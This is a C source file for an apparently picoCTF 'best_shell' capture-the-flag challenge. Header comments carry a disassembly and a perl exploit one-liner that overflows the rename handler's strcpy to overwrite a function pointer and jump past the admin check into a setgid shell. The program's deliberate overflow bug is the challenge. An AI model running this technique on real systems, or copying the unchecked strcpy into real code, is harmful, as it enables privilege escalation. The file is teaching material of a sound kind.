/*
** Solution
**080489c6 <shell_handler>:
**  80489c6:       55                      push   ebp
**  80489c7:       89 e5                   mov    ebp,esp
**  80489c9:       83 ec 28                sub    esp,0x28
**  80489cc:       0f b6 05 85 b0 04 08    movzx  eax,BYTE PTR ds:0x804b085
**  80489d3:       84 c0                   test   al,al
**  80489d5:       74 2f                   je     8048a06 <shell_handler+0x40>
**  80489d7:       e8 24 fc ff ff          call   8048600 <getegid@plt>         # HERE ! #
**  80489dc:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
**  80489df:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
**  80489e2:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
**  80489e6:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
**  80489e9:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
**  80489ed:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
**  80489f0:       89 04 24                mov    DWORD PTR [esp],eax
**  80489f3:       e8 a8 fc ff ff          call   80486a0 <setresgid@plt>
**  80489f8:       c7 04 24 a3 8e 04 08    mov    DWORD PTR [esp],0x8048ea3
**  80489ff:       e8 2c fc ff ff          call   8048630 <system@plt>
**  8048a04:       eb 0c                   jmp    8048a12 <shell_handler+0x4c>
**  8048a06:       c7 04 24 ab 8e 04 08    mov    DWORD PTR [esp],0x8048eab
**  8048a0d:       e8 0e fc ff ff          call   8048620 <puts@plt>
**  8048a12:       c9                      leave
**  8048a13:       c3                      ret
**
*/

/*
** pico4180@shell:/home/best_shell$ (perl -e 'print "rename add AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" . "mult" . "A"x28 ."\xd7\x89\x04\x08\x00\n"'; perl -e 'print "mult" . "A"x28 . "\xd7\x89\x04\x08" . "\n"'; cat)|./best_shell
** "mult"A"(x 28 times)\xd7\x89\x04\x08" is the name of the new mult command
** since strcpy stops at the first NULL characters, we can't do "mult\x00" otherwise the handler won't be replaced by our addr.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#define NUMHANDLERS 6

typedef struct input_handler {
    char cmd[32];
    void (*handler)(char *);
} input_handler;

bool admin = false;
char admin_password[64];
input_handler handlers[NUMHANDLERS];

input_handler *find_handler(char *cmd){
    int i;
    for(i = 0; i < NUMHANDLERS; i++){
        if (!strcmp(handlers[i].cmd, cmd)){
            return &handlers[i];
        }
    }

    return NULL;
}

void lol_handler(char *arg){
    if (arg == NULL){
        printf("usage: lol [string]\n");
        return;
    }

    printf("lol %s\n", arg);
}

void add_handler(char *arg){
    int arg1;
    int arg2;

    if (arg == NULL){
        printf("usage: add [num1] [num2]\n");
        return;
    }

    sscanf(arg, "%d %d", &arg1, &arg2);

    printf("= %d\n", arg1 + arg2);
}

void mult_handler(char * arg){
    int arg1;
    int arg2;

    if (arg == NULL){
        printf("usage: mult [num1] [num2]\n");
        return;
    }

    sscanf(arg, "%d %d", &arg1, &arg2);

    printf("= %d\n", arg1 * arg2);
}

void rename_handler(char *arg){
    char *existing;
    char *new;

    if (arg == NULL){
        printf("usage: rename [cmd_name] [new_name]\n");
        return;
    }

    existing = strtok(arg, " ");
    new = strtok(NULL, "");

    if (new == NULL){
        printf("usage: rename [cmd_name] [new_name]\n");
        return;
    }

    input_handler *found = find_handler(existing);

    if (found != NULL){
        strcpy(found->cmd, new);
    }else{
        printf("No command found.\n");
    }
}

void auth_admin_handler(char *arg){
    if (arg == NULL){
        printf("usage: auth [password]\n");
        return;
    }

    if (!strcmp(arg, admin_password)){
        admin = true;
        printf("You are now admin!\n");
    }else{
        printf("Incorrect password!\n");
    }
}

void shell_handler(char *arg){
    if (admin){
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        system("/bin/sh");
    }else{
        printf("You must be admin!\n");
    }
}

void setup_handlers(){
    handlers[0] = (input_handler){"shell", shell_handler};
    handlers[1] = (input_handler){"auth", auth_admin_handler};
    handlers[2] = (input_handler){"rename", rename_handler};
    handlers[3] = (input_handler){"add", add_handler};
    handlers[4] = (input_handler){"mult", mult_handler};
    handlers[5] = (input_handler){"lol", lol_handler};
}

void input_loop(){
    char input_buf[128];
    char *cmd;
    char *arg;
    input_handler *handler;

    printf(">> ");
    fflush(stdout);
    while(fgets(input_buf, 128, stdin)){
        cmd = strtok(input_buf, " \n");
        arg  = strtok(NULL, "\n");

         handler = find_handler(cmd);

         if (handler != NULL){
             handler->handler(arg);
         }else{
             printf("Command \"%s\" not found!\n", cmd);
         }

        printf(">> ");
        fflush(stdout);
    }
}

int main(int argc, char **argv){
    FILE *f = fopen("/home/best_shell/password.txt","r");
    if (f == NULL){
        printf("Cannot open password file");
        exit(1);
    }

    fgets(admin_password, 64, f);
    admin_password[strcspn(admin_password, "\n")] = '\0';
    fclose(f);

    setup_handlers();
    input_loop();

    return 0;
}
